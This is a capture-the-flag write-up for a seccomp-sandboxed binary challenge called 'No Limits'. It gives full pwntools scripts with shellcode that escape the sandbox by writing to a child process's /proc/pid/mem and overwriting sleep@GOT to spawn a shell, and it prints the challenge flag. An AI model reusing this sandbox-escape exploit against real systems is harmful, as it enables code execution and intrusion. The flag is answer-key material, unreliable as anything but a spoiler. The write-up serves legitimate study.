# Prompt

![](/huntress_2025/Day_30/No_Limits/Challenge_NoLimits.png "Challenge Prompt")

# Solution

- It’s a binary exploitation challenge which uses seccomp to whitelist what actions are allowed to be run.

![Seccomp](/huntress_2025/Day_30/No_Limits/Seccomp.png "Seccomp")

- Here's my initial script for testing that tested the open, write, and lseek

```python
#!/usr/bin/env python3
# Use allowed syscalls to check access, open, and lseek to get file size for /flag.txt.
from pwn import *
import sys, re
import struct

context.arch = 'amd64'
context.log_level = 'info'

if len(sys.argv) < 3:
    print("Usage: python3 connect.py <host> <port>")
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])

# Assembly shellcode (fixed): write "/flag.txt\0" to stack safely using movabs -> mov [rdi], rax pattern
sc = asm(r"""
    xor rax, rax
    sub rsp, 0x80

    /* pointers */
    lea rdi, [rsp+0x40]        /* place filename at rsp+0x40 */

    /* store filename "/flag.txt\0" safely:
       first 8 bytes: b'/flag.tx' little-endian immediate
       then byte at +8 = 't', +9 = 0
    */
    movabs rax, 0x78742e67616c662f   /* bytes: 2f 66 6c 61 67 2e 74 78 => "/flag.tx" */
    mov qword ptr [rdi], rax
    mov byte ptr [rdi+8], 0x74       /* 't' */
    mov byte ptr [rdi+9], 0x00

    /* access(path, R_OK=4) */
    mov rsi, 4                 /* R_OK */
    mov rax, 21                /* syscall: access */
    syscall
    /* save access return value at rsp+0x10 */
    mov qword ptr [rsp+0x10], rax

    /* open(path, O_RDONLY=0) */
    mov rdi, rdi               /* filename pointer */
    xor rsi, rsi               /* flags = 0 (O_RDONLY) */
    mov rax, 2                 /* syscall: open */
    syscall
    /* save open return (fd or negative) at rsp+0x18 */
    mov qword ptr [rsp+0x18], rax

    /* prepare default size = 0 */
    mov qword ptr [rsp+0x20], 0

    /* if (rax >= 0) do lseek */
    cmp rax, 0
    jl .no_lseek

    /* rax is fd */
    mov rdi, rax               /* fd */
    xor rsi, rsi               /* offset = 0 */
    mov rdx, 2                 /* whence = SEEK_END (2) */
    mov rax, 8                 /* syscall: lseek */
    syscall
    /* result is file offset (size) in rax */
    mov qword ptr [rsp+0x20], rax

.no_lseek:
    /* Now write back 24 bytes: access_ret, open_ret, size */
    lea rsi, [rsp+0x10]
    mov rdi, 1
    mov rdx, 24
    mov rax, 1
    syscall

    /* exit(0) */
    xor rdi, rdi
    mov rax, 60
    syscall
""")

log.info("shellcode length: %d" % len(sc))

def parse_and_print(raw):
    if not raw:
        print("<no data received>")
        return
    # Ensure we have at least 24 bytes
    if len(raw) < 24:
        print("received less than 24 bytes:", raw, len(raw))
        return
    access_ret = struct.unpack("<q", raw[0:8])[0]  # signed
    open_ret   = struct.unpack("<q", raw[8:16])[0]
    size_ret   = struct.unpack("<Q", raw[16:24])[0]  # unsigned size

    print("Raw (hex):", raw.hex())
    print()
    print("access(path, R_OK) returned (signed):", access_ret)
    if access_ret == 0:
        print(" -> access: OK (process has read permission)")
    else:
        print(" -> access indicates error (-errno). errno (approx):", -access_ret)

    print()
    if open_ret >= 0:
        print("open(path) returned fd:", open_ret)
    else:
        print("open(path) returned error (signed):", open_ret, " -> errno:", -open_ret)

    print()
    if open_ret >= 0:
        print("lseek(fd, 0, SEEK_END) returned file size:", size_ret, "bytes")
    else:
        print("file size unknown because open failed")

def main():
    r = remote(host, port, timeout=10)
    # wait for menu
    r.recvuntil(b"Enter the command you want to do:", timeout=6)

    # create memory
    r.sendline(b"1")
    r.recvuntil(b"How big do you want your memory to be?", timeout=6)
    size = max(0x200, len(sc) + 0x60)
    r.sendline(str(size).encode())

    r.recvuntil(b"What permissions would you like for the memory?", timeout=6)
    r.sendline(b"7")

    r.recvuntil(b"What do you want to include?", timeout=6)
    r.send(sc + b"\n")

    # read post-write output
    data = r.recvuntil(b"Enter the command you want to do:", timeout=6)
    print(data.decode(errors='ignore'))

    # execute
    r.sendline(b"3")
    r.recvuntil(b"Where do you want to execute code?", timeout=6)
    m = re.search(rb"Wrote your buffer at\s+(0x[0-9a-fA-F]+)", data)
    if m:
        r.sendline(m.group(1))
    else:
        r.sendline(b"0")

    # receive 24 bytes
    leaked = b""
    try:
        leaked = r.recvn(24, timeout=4)
    except Exception:
        try:
            leaked = r.recv(timeout=4)
        except Exception:
            leaked = b""

    print("---- SERVICE OUTPUT (raw) ----")
    print(repr(leaked))
    print("---- PARSED ----")
    parse_and_print(leaked)
    print("-------------------------------")
    r.close()

if __name__ == '__main__':
    main()
```

![Sample Code](/huntress_2025/Day_30/No_Limits/Initial_Code.png "Sample code")

- After this, I found this CTF writeup which is eerily similar.  See: https://systemweakness.com/limited-resources-using-linuxs-ptrace-to-achieve-your-ends-65a7f001e4f8. I also noticed, while the child process does increase, certain things stay the same such as the file descriptor (fd), Global Offset Table (GOT), etc. So it seems like we need to abuse the mmeory of the child process to break out of our seccomp shell. We know that the menu is a reliable way to get execution, so it should be a good target to use. 

- `readelf -r ./no_limits | egrep 'printf|puts|puts@GOT|open|read|write|fopen|fread|fwrite|system|sleep'`
```
000000404038  000500000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
000000404058  000900000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
0000004040a8  001500000007 R_X86_64_JUMP_SLO 0000000000000000 sleep@GLIBC_2.2.5 + 0
```
- `objdump -d ./no_limits | egrep -i "main|protect|menu|flag"`
```
00000000004013a1 <menu>:
0000000000401443 <ProtectProgram>:
  40175e:       74 14                   je     401774 <ProtectProgram+0x331>
00000000004017a7 <main>:
  40181c:       0f 85 86 00 00 00       jne    4018a8 <main+0x101>
  401868:       75 0f                   jne    401879 <main+0xd2>
  401896:       0f 84 f6 01 00 00       je     401a92 <main+0x2eb>
  4018a6:       eb 88                   jmp    401830 <main+0x89>
  4018b7:       e8 e5 fa ff ff          call   4013a1 <menu>
  401911:       0f 84 7e 01 00 00       je     401a95 <main+0x2ee>
  ...
```

```python
#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"
context.os   = "linux"
context.log_level = "info"

HOST = "10.1.20.201"
PORT = 9999

bin_path = './no_limits'

elf = ELF(bin_path)

try:
    SLEEP_GOT   = elf.got['sleep']
    SHELLCODE_ADDR = elf.got['menu']
except KeyError as e:
    SLEEP_GOT = 0x4040A8
    SHELLCODE_ADDR = 0x4013A1

def connect():
    r = remote(HOST, PORT)
    r.recvuntil(b"Enter the command you want to do:")
    return r

def get_child_pid(r):
    r.sendline(b"2")
    r.recvuntil(b"Child PID = ")
    child_pid = int(r.recvline().strip())
    log.info(f"[+] Child PID: {child_pid}")
    return child_pid

def make_path_push_asm(path: str) -> str:
    encoded = path.encode()
    chunks = [encoded[i : i+8] for i in range(0, len(encoded), 8)]
    chunks.reverse()

    out = []
    for c in chunks:
        if len(c) < 8:
            c = c.ljust(8, b"\x00")
        out.append(f"mov r9, {hex(u64(c))}\npush r9")
    return "\n".join(out)

def build_parent_shellcode(child_pid: int, child_payload: bytes) -> bytes:
    path_asm = make_path_push_asm(f"/proc/{child_pid}/mem\x00")

    parent_asm = f"""
        /* push /proc/child_pid/mem */
        {path_asm}
        mov rdi, rsp   /* path */
        mov rsi, 2     /* O_RDWR */
        xor rdx, rdx
        mov rax, 2     /* open */
        syscall

        test rax, rax
        js .done

        mov r8, rax    /* save fd */

        /* write stage2 shellcode into CHILD memory */
        mov rdi, r8
        mov rsi, {hex(SHELLCODE_ADDR)}
        xor rdx, rdx
        mov rax, 8     /* lseek */
        syscall

        mov rdi, r8
        lea rsi, [rip + stage2]
        mov rdx, {hex(len(child_payload))}
        mov rax, 1     /* write */
        syscall

        /* overwrite sleep@GOT */
        mov rdi, r8
        mov rsi, {hex(SLEEP_GOT)}
        xor rdx, rdx
        mov rax, 8     /* lseek */
        syscall

        mov rdi, r8
        lea rsi, [rip + overwrite_ptr]
        mov rdx, 8
        mov rax, 1
        syscall

    .done:
        jmp .done

    overwrite_ptr:
        .quad {hex(SHELLCODE_ADDR)}

    stage2:
    """

    return asm(parent_asm) + child_payload

def upload_and_execute(r, payload: bytes):
    r.sendline(b"1")
    r.recvuntil(b"How big do you want your memory to be?")
    r.sendline(str(len(payload) + 0x1000).encode())
    r.recvuntil(b"What permissions would you like for the memory?")
    r.sendline(b"7")
    r.recvuntil(b"What do you want to include?")
    r.send(payload + b"\n")

    out = r.recvuntil(b"Enter the command you want to do:")
    addr = re.search(rb"(0x[0-9a-fA-F]+)", out).group(1)

    r.sendline(b"3")
    r.recvuntil(b"Where do you want to execute code?")
    r.sendline(addr)

    log.info(f"[+] Executing shellcode at {addr.decode()}")
    return r

def main():
    r = connect()

    stage2 = asm(shellcraft.execve("/bin/sh", ["/bin/sh", "-i"], 0))

    child_pid = get_child_pid(r)
    full_shellcode = build_parent_shellcode(child_pid, stage2)
    upload_and_execute(r, full_shellcode)

    log.success("[*] Waiting for shell in child process...")
    r.interactive()

if __name__ == "__main__":
    main()
```

![Exploit Results](/huntress_2025/Day_30/No_Limits/exploit.png "Exploit Results")

## Interesting Resources:

- https://keksite.in/posts/Seccomp-Bypass/
- https://blog.bi0s.in/2020/08/24/Pwn/GCTF20-Writeonly/
- http://blog.redrocket.club/2019/04/11/midnightsunctf-quals-2019-gissa2/
- https://systemweakness.com/limited-resources-using-linuxs-ptrace-to-achieve-your-ends-65a7f001e4f8

# Flag

- flag{6f6c733424f20f22303fd47aeb991425}